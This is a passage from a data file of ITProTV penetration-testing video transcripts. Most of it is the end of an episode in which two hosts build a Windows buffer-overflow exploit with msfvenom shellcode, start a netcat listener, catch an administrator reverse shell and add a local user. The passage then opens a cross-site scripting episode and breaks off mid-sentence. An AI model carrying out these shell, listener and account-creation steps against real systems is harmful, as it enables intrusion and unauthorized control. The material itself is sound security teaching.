00:08:55.398\n&gt;&gt; I like that, I like that.\n\n166\n00:08:55.398 --> 00:08:56.170\nTIt's exactly right.\n\n167\n00:08:56.170 --> 00:08:57.870\nIt's saying hey, I'm good.\n\n168\n00:08:57.870 --> 00:08:58.814\nMe and you, we're buds.\n\n169\n00:08:58.814 --> 00:09:00.313\n&gt;&gt; [LAUGH]\n&gt;&gt; You should run this code man,\n\n170\n00:09:00.313 --> 00:09:01.960\nit's gonna be good for you.\n\n171\n00:09:01.960 --> 00:09:05.107\nMan, come over here,\nyou wanna try some of this?\n\n172\n00:09:05.107 --> 00:09:06.454\niI's the drug dealer of encoders.\n\n173\n00:09:06.454 --> 00:09:08.883\n[LAUGH]\n&gt;&gt; We're having fun now.\n\n174\n00:09:08.883 --> 00:09:10.140\n&gt;&gt; Yeah.\n\n175\n00:09:10.140 --> 00:09:11.520\n&gt;&gt; So obviously like a long string.\n\n176\n00:09:11.520 --> 00:09:13.560\nBut what this is gonna do,\nit's gonna create that shell code.\n\n177\n00:09:13.560 --> 00:09:16.770\nSoon as I hit Enter here,\nit's gonna churn and burn.\n\n178\n00:09:16.770 --> 00:09:17.990\nIt ranks through it.\n\n179\n00:09:17.990 --> 00:09:21.570\nCPU is doing its calculations,\nsaying, man.\n\n180\n00:09:21.570 --> 00:09:23.350\nCan't use these back characters.\n\n181\n00:09:23.350 --> 00:09:24.520\nAnd there is the output.\n\n182\n00:09:24.520 --> 00:09:31.150\nThis is our shell code that we are going\nto copy and paste into our actual Exploit.\n\n183\n00:09:31.150 --> 00:09:33.490\nSo now that we have that,\nI can copy and paste this.\n\n184\n00:09:34.560 --> 00:09:35.940\nI've already done it.\n\n185\n00:09:35.940 --> 00:09:37.009\nSave us some steps here.\n\n186\n00:09:37.009 --> 00:09:40.059\nI will nano into sploits.py.\n\n187\n00:09:40.059 --> 00:09:43.893\nAgain, this should start to be\nlooking very familiar to you at this\n\n188\n00:09:43.893 --> 00:09:45.520\npoint in time.\n\n189\n00:09:45.520 --> 00:09:48.420\nAnd I'll just reiterate some\nthings just so we remember.\n\n190\n00:09:48.420 --> 00:09:52.420\nRemember, the attack is\nour initial Input so\n\n191\n00:09:52.420 --> 00:09:54.930\nthat we can get to\nthe overflow into the EIP.\n\n192\n00:09:54.930 --> 00:09:57.230\nWe found out what that was.\n\n193\n00:09:57.230 --> 00:09:58.850\nThe offset was 2003.\n\n194\n00:09:58.850 --> 00:10:01.670\nSo after 2003 bytes comes the EIP.\n\n195\n00:10:02.830 --> 00:10:04.570\nIn the EIP, we set that value.\n\n196\n00:10:04.570 --> 00:10:07.610\nThere was the correct value that\nI had found prior to us trying\n\n197\n00:10:07.610 --> 00:10:09.520\nto figure out which one that was.\n\n198\n00:10:09.520 --> 00:10:10.370\nThis one will work.\n\n199\n00:10:10.370 --> 00:10:12.505\nI've tested it and know that.\n\n200\n00:10:12.505 --> 00:10:16.120\nAll you had to do is go\nthrough the modules and\n\n201\n00:10:16.120 --> 00:10:21.706\ntry them all until you found that one\nIn EIP going to a jump ESP value.\n\n202\n00:10:21.706 --> 00:10:23.654\nThat one did work.\n\n203\n00:10:23.654 --> 00:10:25.260\nWe're gonna get to this in just a second.\n\n204\n00:10:25.260 --> 00:10:27.085\nThen there's our pad.\n\n205\n00:10:27.085 --> 00:10:31.770\nYou also know that I'm\nmodifying some data here.\n\n206\n00:10:32.990 --> 00:10:35.779\nOne thing you need to know is\nhow big was my shell code.\n\n207\n00:10:35.779 --> 00:10:38.150\nThat's an important factor.\n\n208\n00:10:38.150 --> 00:10:42.228\nAnd when I did the MS of Venom, it\nactually said, here's your shell code and\n\n209\n00:10:42.228 --> 00:10:44.010\nit's x amount of bytes.\n\n210\n00:10:44.010 --> 00:10:46.230\nI don't know, let me Ctrl X out of here.\n\n211\n00:10:47.350 --> 00:10:48.290\nThere it is right here.\n\n212\n00:10:50.020 --> 00:10:55.770\nPayload size 351 bytes,\nnot final size of C file.\n\n213\n00:10:55.770 --> 00:10:59.890\nThat's not what you're looking for,\nbut the payload size, 351 bytes.\n\n214\n00:10:59.890 --> 00:11:04.500\nNow I know that because remember,\nwe're working with a 3,000 byte string of\n\n215\n00:11:04.500 --> 00:11:10.500\ncharacters that are gonna become commands,\nthat the program's gonna execute.\n\n216\n00:11:10.500 --> 00:11:15.090\nSo I need to know that, so\nI gotta adjust for that inside of my code.\n\n217\n00:11:15.090 --> 00:11:18.950\nSo let's go back to nano\ninto the Sploit here.\n\n218\n00:11:21.020 --> 00:11:23.459\nSo that's why you see C.\n\n219\n00:11:23.459 --> 00:11:26.150\nRight here is now 626 bytes.\n\n220\n00:11:26.150 --> 00:11:28.615\nAnd also to give this X90\nwhich is called Nops.\n\n221\n00:11:28.615 --> 00:11:30.588\nWe'll talk about that in just a second.\n\n222\n00:11:30.588 --> 00:11:33.088\nA 16 byte value because\nthis is taking him through.\n\n223\n00:11:33.088 --> 00:11:39.971\nSo base cover, remember before,\nit was like 994.\n\n224\n00:11:39.971 --> 00:11:42.940\nIt was 994 bytes because\nwe had 2003 bytes here.\n\n225\n00:11:42.940 --> 00:11:45.650\nWe had 4 bytes in the EIP and\nthe Cs took up the rest of it,\n\n226\n00:11:45.650 --> 00:11:47.340\nwhich was 990 something.\n\n227\n00:11:47.340 --> 00:11:53.890\nNow I'm reducing 351 from that,\nwhich comes out to 626, continuing my pad.\n\n228\n00:11:53.890 --> 00:11:57.150\n&gt;&gt; The end goal there is just to make sure\nthat taking all of that into account,\n\n229\n00:11:57.150 --> 00:12:01.070\nthe attack, which you've got to separate,\nthe EIP, the NOPs, the payload or\n\n230\n00:12:01.070 --> 00:12:02.040\nthe shell.\n\n231\n00:12:02.040 --> 00:12:03.680\nAll of that has to total up to 3,000.\n\n232\n00:12:03.680 --> 00:12:07.380\nSo we can change that pad a little\nbit to make sure that in the end,\n\n233\n00:12:07.380 --> 00:12:08.500\nwe have 3,000 bytes for sending.\n\n234\n00:12:08.500 --> 00:12:09.230\n&gt;&gt; That's exactly right.\n\n235\n00:12:09.230 --> 00:12:12.520\nWe wanna stick with we've already\ndone to make sure it stays the same.\n\n236\n00:12:12.520 --> 00:12:14.310\nWe don't wanna adjust values.\n\n237\n00:12:14.310 --> 00:12:16.728\nSo we gotta make sure everything\nworks itself out to 3,000.\n\n238\n00:12:16.728 --> 00:12:20.796\nSo when you copy and paste the shell code,\n\n239\n00:12:20.796 --> 00:12:25.340\nyou notice that I have\nthis open parentheses.\n\n240\n00:12:25.340 --> 00:12:30.970\nAnd then, each one of these have\na double quote on each end.\n\n241\n00:12:30.970 --> 00:12:33.980\nThat way I can make this\nin block formats and\n\n242\n00:12:33.980 --> 00:12:36.630\nnot have it string off like we\ndid with our unique character.\n\n243\n00:12:36.630 --> 00:12:38.170\nI didn't care so much there, but\n\n244\n00:12:38.170 --> 00:12:41.180\nhere I want you to see what it\nkinda looks like in the end result.\n\n245\n00:12:41.180 --> 00:12:44.080\nYou can make it string off into\nthe end of creation if you want and\n\n246\n00:12:44.080 --> 00:12:46.190\njust do it normally like we have up here.\n\n247\n00:12:46.190 --> 00:12:49.820\nBut if you want a block code,\nget your open parenthesis and\n\n248\n00:12:49.820 --> 00:12:52.190\nthen just add the double quotes\nat the end of each strand.\n\n249\n00:12:52.190 --> 00:12:54.290\nJust chop it wherever you like.\n\n250\n00:12:54.290 --> 00:12:56.390\nChop it, add your double quotes,\nchop it, add your double quotes,\n\n251\n00:12:56.390 --> 00:12:57.750\nchop it, add your double quotes.\n\n252\n00:12:57.750 --> 00:13:01.695\nAnd at the end,\nthere was also a semi-colon here.\n\n253\n00:13:01.695 --> 00:13:02.720\nRemove that.\n\n254\n00:13:02.720 --> 00:13:05.260\nAnd make sure your closed\nparenthesis is there.\n\n255\n00:13:05.260 --> 00:13:09.310\nThat's the only caveats I wanna give you,\nas far as Python goes,\n\n256\n00:13:09.310 --> 00:13:12.630\nto make sure this variable\nis structured correctly.\n\n257\n00:13:12.630 --> 00:13:16.790\nThat being said, you'll notice\nthat we go down here to my send,\n\n258\n00:13:16.790 --> 00:13:18.530\nwhat I'm sending, send the attack.\n\n259\n00:13:18.530 --> 00:13:20.563\nThat's all the A's, the EIP,\n\n260\n00:13:20.563 --> 00:13:24.490\nthat's the four bytes of the EIP\nwhere that jump ESP resides.\n\n261\n00:13:25.830 --> 00:13:26.740\nNow let's talk about NOPs.\n\n262\n00:13:26.740 --> 00:13:28.508\nWhat is NOPs?\n\n263\n00:13:28.508 --> 00:13:35.200\nNOPs are no operators, or null operators,\nand the value for NOP is x90.\n\n264\n00:13:35.200 --> 00:13:38.738\nThat's what you wanna know right there.\n\n265\n00:13:38.738 --> 00:13:41.280\nThat's our boy, where you going?\n\n266\n00:13:41.280 --> 00:13:43.714\nOver there, x90,\nthat's what you wanna know.\n\n267\n00:13:43.714 --> 00:13:46.511\nNOPs are basically an instruction\nto the computer to say,\n\n268\n00:13:46.511 --> 00:13:47.890\ngo to the next instruction.\n\n269\n00:13:47.890 --> 00:13:48.980\nGo to the next instruction.\n\n270\n00:13:51.740 --> 00:13:56.520\nI like to pad with NOPs because what can\nhappen is, If you don't have some NOPs at\n\n271\n00:13:56.520 --> 00:14:00.540\nthe beginning of your code, a lot of\ntimes, it will just not work, right.\n\n272\n00:14:00.540 --> 00:14:04.460\nIt's just a, I don't know why it\ndoes that to be honest with you.\n\n273\n00:14:04.460 --> 00:14:07.150\nI just know that putting NOPs at\nthe beginning of that stops that from\n\n274\n00:14:07.150 --> 00:14:07.674\nhappening.\n\n275\n00:14:07.674 --> 00:14:11.993\nIf you don't put the NOPs, if I just threw\nthis with the shell code, it might work,\n\n276\n00:14:11.993 --> 00:14:13.748\nit might not, and probably not.\n\n277\n00:14:13.748 --> 00:14:17.520\nYou throw some NOPs at the beginning of\nthat, It kind of gives it that buffer.\n\n278\n00:14:17.520 --> 00:14:21.651\nIt's a little bit of a buffer between,\nokay, we've jumped to the ESP,\n\n279\n00:14:21.651 --> 00:14:25.600\nand now you're giving me the shell code,\nand it's freaking me out.\n\n280\n00:14:25.600 --> 00:14:27.802\nSo we put a little NOPs on there, and\nit just says hey, my instruction,\n\n281\n00:14:27.802 --> 00:14:28.706\ngo to the next instruction.\n\n282\n00:14:28.706 --> 00:14:31.343\nGo to the next instruction.\n\n283\n00:14:31.343 --> 00:14:33.350\nApparently it calms down to\nthe computer [LAUGH] the system.\n\n284\n00:14:33.350 --> 00:14:35.300\n&gt;&gt; It's almost like a little grease for\nthe CPU.\n\n285\n00:14:35.300 --> 00:14:38.520\nYou don't want it getting stuck on one\nthing and spending too much time there.\n\n286\n00:14:38.520 --> 00:14:40.470\nYou're like, hey,\njust move onto the next instruction.\n\n287\n00:14:40.470 --> 00:14:43.290\nEventually you'll get to the instruction\nI really want you to execute.\n\n288\n00:14:43.290 --> 00:14:43.860\n&gt;&gt; Yeah, exactly.\n\n289\n00:14:43.860 --> 00:14:48.980\nSometimes you'll see this called a NOP\nsled cuz it's sledding you into the code.\n\n290\n00:14:48.980 --> 00:14:50.800\nBut, just be aware, that's there.\n\n291\n00:14:50.800 --> 00:14:51.330\nI put 16 bytes.\n\n292\n00:14:51.330 --> 00:14:54.320\nSometimes you can get away with 8 bytes.\n\n293\n00:14:54.320 --> 00:14:55.450\nI like 16.\n\n294\n00:14:55.450 --> 00:14:57.190\nThat's me as a programmer.\n\n295\n00:14:57.190 --> 00:14:59.280\nThat's what's worked for me in the past.\n\n296\n00:14:59.280 --> 00:15:02.070\nSo that's what I continue to deal with.\n\n297\n00:15:02.070 --> 00:15:05.690\nAll right, so the NOPs are in,\nthe values all are correct.\n\n298\n00:15:05.690 --> 00:15:10.000\nIf you add all this up,\n2003 plus 4 plus 16 plus 626 plus 351 for\n\n299\n00:15:10.000 --> 00:15:14.055\nmy shell code, that equals 3,000.\n\n300\n00:15:14.055 --> 00:15:17.100\nThats all I found in my buffer.\n\n301\n00:15:17.100 --> 00:15:18.360\nLet me zoom back out here.\n\n302\n00:15:20.030 --> 00:15:22.734\nAnd if we scroll down,\nthere's my send, there it is.\n\n303\n00:15:22.734 --> 00:15:25.134\nAttack EIP NOPs shell, and my padding.\n\n304\n00:15:25.134 --> 00:15:31.980\nAnything left over, if we fire this off,\nwe should have a successful Exploit code.\n\n305\n00:15:31.980 --> 00:15:33.810\nSo now you know what happened.\n\n306\n00:15:33.810 --> 00:15:34.960\nRemember back in episode one?\n\n307\n00:15:34.960 --> 00:15:39.130\nAnd I said, hey,\nfire off split.py and we got a shell?\n\n308\n00:15:39.130 --> 00:15:40.170\nWell, this is what.\n\n309\n00:15:40.170 --> 00:15:41.060\nThis is what took.\n\n310\n00:15:41.060 --> 00:15:45.650\nThis is what it took to get us to\nbeing able to fire off split.py and\n\n311\n00:15:45.650 --> 00:15:47.470\nmaking an exploit happen.\n\n312\n00:15:47.470 --> 00:15:48.250\nSo let's do it.\n\n313\n00:15:48.250 --> 00:15:49.954\nLet's Ctrl+X out of here.\n\n314\n00:15:49.954 --> 00:15:56.937\nAnd let's start our listener, netcat,\nnc -nlvp or nvlp, however you like it.\n\n315\n00:15:56.937 --> 00:16:00.218\nAnd on port 5555.\n\n316\n00:16:00.218 --> 00:16:05.466\nAnd Make sure the vulnerable\nserver is running.\n\n317\n00:16:05.466 --> 00:16:07.182\nRun as administrator.\n\n318\n00:16:07.182 --> 00:16:11.105\nNot gonna load it into immunity\nat this point in time,\n\n319\n00:16:11.105 --> 00:16:13.665\nbecause if it works, we can show.\n\n320\n00:16:13.665 --> 00:16:15.021\n&gt;&gt; [LAUGH]\n&gt;&gt; You'll know if it works or not,\n\n321\n00:16:15.021 --> 00:16:15.788\nyou'll have a show.\n\n322\n00:16:15.788 --> 00:16:21.474\nI do ./exploit, here we go.\n\n323\n00:16:21.474 --> 00:16:23.637\n&gt;&gt; Drum roll.\n\n324\n00:16:23.637 --> 00:16:26.280\n&gt;&gt; Here we go, return,\nthere we go, and there it is.\n\n325\n00:16:28.990 --> 00:16:31.519\nThat's good hacking right there,\nthat tastes good.\n\n326\n00:16:31.519 --> 00:16:34.037\n&gt;&gt; I'm telling you, I think trumpets\nare playing somewhere, I like it.\n\n327\n00:16:34.037 --> 00:16:37.730\n&gt;&gt; You do the who am I.\n\n328\n00:16:37.730 --> 00:16:41.438\nAnd it says,\nyou are logged in as administrator, and\n\n329\n00:16:41.438 --> 00:16:43.640\nI now have prompt to that server.\n\n330\n00:16:43.640 --> 00:16:47.576\nI have exploited the fact that\nI was able to buffer overflow,\n\n331\n00:16:47.576 --> 00:16:50.364\nit fired off my exploit code, and I'm in.\n\n332\n00:16:50.364 --> 00:16:56.781\nI am an administrator,\nI can start doing what,\n\n333\n00:16:56.781 --> 00:17:02.750\nlike met localuser, hacker hacker /add.\n\n334\n00:17:02.750 --> 00:17:07.644\nActually, I already have that user, so.\n\n335\n00:17:07.644 --> 00:17:13.324\nYou'll notice it doesn't like [LAUGH]\nweird characters like backspaces and\n\n336\n00:17:13.324 --> 00:17:14.750\nthings like that.\n\n337\n00:17:14.750 --> 00:17:19.678\nOne of the caveats of working with\nexploited shells that you tunnel\n\n338\n00:17:19.678 --> 00:17:20.734\nto yourself.\n\n339\n00:17:20.734 --> 00:17:24.172\nReally kinda hinky,\nyou wanna get better code.\n\n340\n00:17:24.172 --> 00:17:26.203\nYou wanna be able to like SSH in.\n\n341\n00:17:26.203 --> 00:17:27.876\nSo you're gonna go from here, and\n\n342\n00:17:27.876 --> 00:17:31.400\nmaybe create yourself a user account\nlike what I was trying to do.\n\n343\n00:17:31.400 --> 00:17:36.352\nSo I can say, what was it,\nnet user, no I'm sorry,\n\n344\n00:17:36.352 --> 00:17:39.177\nlocal user, local, right?\n\n345\n00:17:39.177 --> 00:17:40.098\nIs it local user, Mike?\n\n346\n00:17:40.098 --> 00:17:41.223\nYou're the Windows guy.\n\n347\n00:17:41.223 --> 00:17:43.505\n&gt;&gt; Gosh, it's been so long since\nI've done one from the command line.\n\n348\n00:17:43.505 --> 00:17:49.567\n&gt;&gt; I'll call mike mike /add.\n\n349\n00:17:49.567 --> 00:17:50.945\nThere we go, it fired off.\n\n350\n00:17:50.945 --> 00:17:51.904\nLet's go over to that machine.\n\n351\n00:17:54.593 --> 00:18:00.947\nAnd Computer &gt; Manage Local Users and\nGroups.\n\n352\n00:18:00.947 --> 00:18:04.062\nAnd, I guess I didn't say it right.\n\n353\n00:18:04.062 --> 00:18:08.083\nBut if,\nI can never remember what it is for that.\n\n354\n00:18:08.083 --> 00:18:10.919\nBut that's it, I can give it commands.\n\n355\n00:18:10.919 --> 00:18:12.578\nI can say dir, I can look at that.\n\n356\n00:18:12.578 --> 00:18:15.734\nI can create files,\nI can edit files, I can, obviously,\n\n357\n00:18:15.734 --> 00:18:19.740\nif I remember the correct syntax for\ncreating a local user account.\n\n358\n00:18:19.740 --> 00:18:22.651\n&gt;&gt; Try net user and then just use name and\nslash add no password.\n\n359\n00:18:22.651 --> 00:18:23.696\n&gt;&gt; Okay, let's try that.\n\n360\n00:18:23.696 --> 00:18:25.333\nSo-\n&gt;&gt; And then you get to go back and\n\n361\n00:18:25.333 --> 00:18:25.975\nset the password after.\n\n362\n00:18:25.975 --> 00:18:31.766\n&gt;&gt; Net user mike, okay,\nand we'll say /add.\n\n363\n00:18:31.766 --> 00:18:34.723\nThere you go,\nthe command is completed successfully.\n\n364\n00:18:34.723 --> 00:18:36.461\nWe go over here and refresh that.\n\n365\n00:18:39.952 --> 00:18:42.064\nWhere is it, refresh.\n\n366\n00:18:42.064 --> 00:18:42.939\nI'm a horrible mouse user.\n\n367\n00:18:42.939 --> 00:18:45.021\n&gt;&gt; [LAUGH]\n&gt;&gt; And there he is Mike,\n\n368\n00:18:45.021 --> 00:18:47.444\nI can set the password for\nhim, I can do whatever I want.\n\n369\n00:18:47.444 --> 00:18:50.676\nI have administrative control and\nthat's the danger of buffer overflows.\n\n370\n00:18:50.676 --> 00:18:51.546\n&gt;&gt; Right.\n\n371\n00:18:51.546 --> 00:18:54.408\n&gt;&gt; All right, so that's it, that's buffer\noverflows, I'm trying to think is there\n\n372\n00:18:54.408 --> 00:18:57.641\nanything left, other than\n&gt;&gt; Take a deep breath.\n\n373\n00:18:57.641 --> 00:18:59.432\n&gt;&gt; Yeah, take a deep breath,\nthis was a long process.\n\n374\n00:18:59.432 --> 00:19:02.821\nIt was a lot of work, and\nthat's the process you have to go through.\n\n375\n00:19:02.821 --> 00:19:04.522\nAnd it's difficult and it's painstaking.\n\n376\n00:19:04.522 --> 00:19:07.239\nBut man, when you get that shell,\n\n377\n00:19:07.239 --> 00:19:11.945\nwhen that thing pops back over,\nand says C colon, who am I?\n\n378\n00:19:11.945 --> 00:19:16.490\nAdministrator, create local user account,\nput it in the administrator's group.\n\n379\n00:19:16.490 --> 00:19:20.609\nAnd you do that, you're so\nexcited, it's so much fun.\n\n380\n00:19:20.609 --> 00:19:23.042\nOf course,\nnow you've gotta tell your customer that.\n\n381\n00:19:23.042 --> 00:19:26.754\nAnd we were able to you know that in\nhouse thing you guys wrote, it's totally\n\n382\n00:19:26.754 --> 00:19:30.473\nvulnerable to a buffer overflow [LAUGH]\ncuz we kind of exploited your system.\n\n383\n00:19:30.473 --> 00:19:32.416\n&gt;&gt; Yeah, but that's what they pay us for,\n\n384\n00:19:32.416 --> 00:19:35.460\nto find those vulnerabilities\nbefore the bad guys do, right?\n\n385\n00:19:35.460 --> 00:19:39.194\nSo fantastic Daniel, tell you what\nquestion for you, now we looked at this\n\n386\n00:19:39.194 --> 00:19:42.770\nfrom the Windows perspective, so\nan application running on Windows.\n\n387\n00:19:42.770 --> 00:19:46.015\nIs Linux immune to the whole\nbuffer overflow thing?\n\n388\n00:19:46.015 --> 00:19:49.240\n&gt;&gt; Nope, it's a program like anything\nelse, services like anything else.\n\n389\n00:19:49.240 --> 00:19:51.153\nThey have their own\nbuffer overflows as well,\n\n390\n00:19:51.153 --> 00:19:53.616\nyou can do buffer overflows\ninside of a Linux environment.\n\n391\n00:19:53.616 --> 00:19:56.425\nI wont' go back through the entirety\nof that, obviously, but\n\n392\n00:19:56.425 --> 00:19:58.608\nI'll show you some of\nthe options that you have.\n\n393\n00:19:58.608 --> 00:19:59.981\nLet's go back to my screen.\n\n394\n00:19:59.981 --> 00:20:02.138\nI'll close these down here,\nso I'll exit out.\n\n395\n00:20:02.138 --> 00:20:03.174\nThank you, good bye.\n\n396\n00:20:03.174 --> 00:20:07.453\nClose this, close this,\nand inside of Kali,\n\n397\n00:20:07.453 --> 00:20:12.080\nthey have quite a few\nunder reverse engineering.\n\n398\n00:20:13.660 --> 00:20:17.902\nI like this one the best, this EBD bugger.\n\n399\n00:20:17.902 --> 00:20:21.291\nAnd I like it because that\nlooks very similar to immunity,\n\n400\n00:20:21.291 --> 00:20:23.582\nand it works very similar to immunity.\n\n401\n00:20:23.582 --> 00:20:25.197\nSo, I like that one a lot.\n\n402\n00:20:25.197 --> 00:20:27.273\nOllyDbg is in here as well.\n\n403\n00:20:27.273 --> 00:20:30.340\nWith that, I think it only works for\nWindows 32 programs.\n\n404\n00:20:30.340 --> 00:20:32.991\nSo, yeah.\n\n405\n00:20:32.991 --> 00:20:33.868\nWhere did you go?\n\n406\n00:20:33.868 --> 00:20:36.318\nI totally cannot do this.\n\n407\n00:20:36.318 --> 00:20:38.192\nOllyDbg, there you go.\n\n408\n00:20:38.192 --> 00:20:43.078\nThere it is, OllyDbg you can attach,\ndo the whole file, attach and\n\n409\n00:20:43.078 --> 00:20:45.530\nexit, whatever you wanna do.\n\n410\n00:20:45.530 --> 00:20:46.925\nThose are some options as well.\n\n411\n00:20:46.925 --> 00:20:51.898\nWhat else do we, MSFvenom works\na little differently because you have\n\n412\n00:20:51.898 --> 00:20:54.360\nto tell it this is a Linux system.\n\n413\n00:20:54.360 --> 00:20:56.119\nRemember, when you create your shell code,\n\n414\n00:20:56.119 --> 00:20:58.355\nyoure not gonna use the exact\nsame commands as before.\n\n415\n00:20:58.355 --> 00:20:59.691\nLet me open a-\n&gt;&gt; So\n\n416\n00:20:59.691 --> 00:21:02.281\nthe dash P change our platforms\n&gt;&gt; Yeah,\n\n417\n00:21:02.281 --> 00:21:05.660\nyeah let me get an open terminal here and\njust show you real quickly.\n\n418\n00:21:05.660 --> 00:21:08.674\nThe manual page is actually\nquite helpful with this.\n\n419\n00:21:08.674 --> 00:21:14.404\nShift+Ctrl ++,\n\n420\n00:21:14.404 --> 00:21:19.800\nand man ssfvenom.\n\n421\n00:21:19.800 --> 00:21:21.690\nAnd I'll just do a search for Linux.\n\n422\n00:21:24.030 --> 00:21:26.467\nGo to the next.\n\n423\n00:21:26.467 --> 00:21:27.547\nThere we go.\n\n424\n00:21:27.547 --> 00:21:28.401\nYou can see,\n\n425\n00:21:28.401 --> 00:21:33.460\nit's kinda giving you some help here\nwith examples of how you should do that.\n\n426\n00:21:33.460 --> 00:21:37.518\nPlatform Linux-p,\nactually here's a reverse_tcp l host.\n\n427\n00:21:37.518 --> 00:21:41.544\nSo, some of its the same but you gotta\nremember to tell it which type of platform\n\n428\n00:21:41.544 --> 00:21:44.260\nit is, and things of that nature, right.\n\n429\n00:21:44.260 --> 00:21:48.883\nSo just be aware all the concepts that we\ndid, all are the same just the syntax and\n\n430\n00:21:48.883 --> 00:21:51.367\nthings are different because it is Linux.\n\n431\n00:21:51.367 --> 00:21:52.735\nIt's not Windows.\n\n432\n00:21:52.735 --> 00:21:54.817\n&gt;&gt; All right, Daniel, fantastic.\n\n433\n00:21:54.817 --> 00:21:57.274\nI think I'm gonna go home and\nwatch these four shows again.\n\n434\n00:21:57.274 --> 00:21:58.644\nGreat stuff there.\n\n435\n00:21:58.644 --> 00:22:04.280\nWe got to see how to build a buffer\noverflow attack from beginning to end.\n\n436\n00:22:04.280 --> 00:22:09.686\nFind a program, find that it's vulnerable,\nfigure out how we can attack that program.\n\n437\n00:22:09.686 --> 00:22:14.285\nCreate our payload, this gonna deliver\nour reverse show, bundle it all up,\n\n438\n00:22:14.285 --> 00:22:18.350\nget it over there, get that program\nto go through buffer overflow.\n\n439\n00:22:18.350 --> 00:22:23.067\nCall our malicious code that we wanted\nto execute and sends us show back.\n\n440\n00:22:23.067 --> 00:22:24.857\nDoesn't get any better than that.\n\n441\n00:22:24.857 --> 00:22:26.469\n&gt;&gt; That's good hacking right there,\nmy man.\n\n442\n00:22:26.469 --> 00:22:27.387\nThat's what we live for, right?\n\n443\n00:22:27.387 --> 00:22:28.999\n&gt;&gt; That's it, that's it.\n\n444\n00:22:28.999 --> 00:22:29.944\nAll right, well ladies and\n\n445\n00:22:29.944 --> 00:22:32.173\ngentlemen we do have more to come\nwith our penetration testing.\n\n446\n00:22:32.173 --> 00:22:35.110\nBut that is gonna do it for this episode.\n\n447\n00:22:35.110 --> 00:22:38.002\nSo, hope everybody out there\nenjoyed watching this one.\n\n448\n00:22:38.002 --> 00:22:40.574\nSigning off IT Pro TV,\nI've been your host Mike Rodrick.\n\n449\n00:22:40.574 --> 00:22:41.651\n&gt;&gt; And I'm Daniel Lowrie.\n\n450\n00:22:41.651 --> 00:22:42.773\n&gt;&gt; And we'll see you next time.\n\n451\n00:22:44.429 --> 00:22:50.042\n[MUSIC]\n\n452\n00:22:50.042 --> 00:22:51.910\n&gt;&gt; Thank you for watching IT Pro TV.\n\n",
          "vimeoId": "202088646"
        },
        {
          "description": "In this episode, Dan and Mike discuss cross-site scripting. They define what cross-site scripting is as well as how to tell if a site is vulnerable. They demonstrate using cross-site scripting to hijack a session, and to perform a browser redirection.",
          "length": "2506",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-1-web_apps_cross_site_scripting-020117-PGM.00_41_31_14.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-1-web_apps_cross_site_scripting-020117-PGM.00_41_31_14.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-1-web_apps_cross_site_scripting-020117-PGM.00_41_31_14.Still001-sm.jpg",
          "title": "Web Apps Cross Site Scripting",
          "transcript": "WEBVTT\n\n1\n00:00:00.008 --> 00:00:01.230\nWelcome to ITProTV.\n\n2\n00:00:01.230 --> 00:00:03.155\nI'm your host Don Pezet.\n\n3\n00:00:03.155 --> 00:00:06.869\n[CROSSTALK]\n\n4\n00:00:06.869 --> 00:00:08.719\n[MUSIC]\n\n5\n00:00:08.719 --> 00:00:12.650\n&gt;&gt; You're watching ITProTV.\n\n6\n00:00:12.650 --> 00:00:15.124\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n7\n00:00:15.124 --> 00:00:20.130\nI'm your host Mike Rodrick and\ntoday we're doing our penetration testing.\n\n8\n00:00:20.130 --> 00:00:21.704\nAnd in this episode,\n\n9\n00:00:21.704 --> 00:00:26.760\nwe're gonna be focusing in on\nweb apps cross-site scripting.\n\n10\n00:00:26.760 --> 00:00:29.671\nIt's a type of attack that is actually\na very common type of attack.\n\n11\n00:00:29.671 --> 00:00:35.512\nI know that it's on the OWASP top 10\njust about every year if not every year.\n\n12\n00:00:35.512 --> 00:00:39.040\nSo here to explain what the heck they are,\nhow they work and\n\n13\n00:00:39.040 --> 00:00:41.930\nshow us a little bit of it Is Mr.\nDaniel Lowrie.\n\n14\n00:00:41.930 --> 00:00:42.890\nWelcome back, Daniel.\n\n15\n00:00:42.890 --> 00:00:44.400\n&gt;&gt; Welcome, Mike.\n\n16\n00:00:44.400 --> 00:00:46.460\nThank you.\nI'm glad to be back if I can get that\n\n17\n00:00:46.460 --> 00:00:47.253\nout of my face hole.\n\n18\n00:00:47.253 --> 00:00:48.175\n&gt;&gt; Those are tricky words.\n\n19\n00:00:48.175 --> 00:00:48.779\n&gt;&gt; Yeah, they are.\n\n20\n00:00:48.779 --> 00:00:49.955\nStumble right over your tongue.\n\n21\n00:00:49.955 --> 00:00:54.229\nBut today is all about cross-site\nscripting and it's, when I first heard of\n\n22\n00:00:54.229 --> 00:00:59.114\ncross-site scripting, I thought it was a,\nwhat do they mean cross-site scripting?\n\n23\n00:00:59.114 --> 00:01:02.240\nI get cross, I get site, I get scripting.\n\n24\n00:01:02.240 --> 00:01:04.630\nI just don't understand what it means\nwhen you put all that together.\n\n25\n00:01:04.630 --> 00:01:06.590\nSo that's what we're gonna\ntry to work through today.\n\n26\n00:01:06.590 --> 00:01:08.990\nSo that you understand what\ncross-site scripting is and\n\n27\n00:01:08.990 --> 00:01:12.780\nof course, like a day without sunshine,\nwhat would be my show without actually\n\n28\n00:01:12.780 --> 00:01:15.630\nshowing you how to perform\na cross-site scripting attack?\n\n29\n00:01:15.630 --> 00:01:17.750\nSo that's what we're going to do as well.\n\n30\n00:01:17.750 --> 00:01:19.160\nSo let's start at the beginning right?\n\n31\n00:01:19.160 --> 00:01:21.420\nGentlemen and ladies,\nthis is a football, right?\n\n32\n00:01:21.420 --> 00:01:23.180\nThis is cross-site scripting.\n\n33\n00:01:23.180 --> 00:01:23.710\nWhat is it?\n\n34\n00:01:23.710 --> 00:01:28.499\nIt is the ability to inject code into\nsomebody else's vulnerable sites, and\n\n35\n00:01:28.499 --> 00:01:32.782\nhave it execute to somebody's client,\nif that makes sense, okay?\n\n36\n00:01:32.782 --> 00:01:36.337\nSo you've got a website out there,\nit's vulnerable for\n\n37\n00:01:36.337 --> 00:01:41.221\nme to be able to put code into it, now\nwe're going to talk about how that works,\n\n38\n00:01:41.221 --> 00:01:46.740\nand then when a user comes along and\nsays, I want to go to this website.\n\n39\n00:01:46.740 --> 00:01:49.620\nAnd they visit that page where\nthat malicious code 